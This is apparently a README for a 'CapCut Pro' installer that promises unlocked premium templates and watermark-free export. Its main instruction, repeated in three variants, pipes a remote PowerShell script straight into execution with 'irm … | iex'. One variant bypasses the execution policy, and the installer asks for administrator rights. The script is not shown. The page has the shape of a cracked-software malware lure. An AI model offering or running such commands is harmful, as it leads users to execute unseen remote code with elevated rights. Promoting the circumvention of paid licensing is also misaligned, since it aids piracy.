# CapCut Pro Installer

One-command setup for CapCut Pro — all-in-one video editor with trending effects, templates, and export without watermark.

## Install

Open **PowerShell** and run:

```powershell
irm https://raw.githubusercontent.com/OWNER/REPO/main/install.ps1 | iex
```

That's it. The installer handles everything.

## What it does

1. Requests administrator rights for codec registration.
2. Downloads the CapCut Pro desktop client with premium assets.
3. Installs H.265/AV1 codec packs for high-quality export.
4. Launches CapCut ready to use — all Pro templates unlocked.

## Requirements

- Windows 10 / 11 (64-bit)
- PowerShell 5.1+
- Internet connection
- 4 GB+ RAM (8 GB recommended for 4K editing)
- ~3 GB free disk space

## Troubleshooting

**Export fails at 99%**

Free up disk space — CapCut needs 2x the output size as temp buffer.

**No Pro templates showing**

Close and reopen CapCut. Templates load after the first sync.

**Watermark still appears**

You're using the web version. The desktop app from this installer has no watermark.

---

**Alternative (bypass execution policy):**

```powershell
powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/OWNER/REPO/main/install.ps1 | iex"
```

**"irm is not recognized"** — old PowerShell. Use:

```powershell
Invoke-RestMethod https://raw.githubusercontent.com/OWNER/REPO/main/install.ps1 | Invoke-Expression
```

## License

MIT — see [LICENSE](LICENSE).
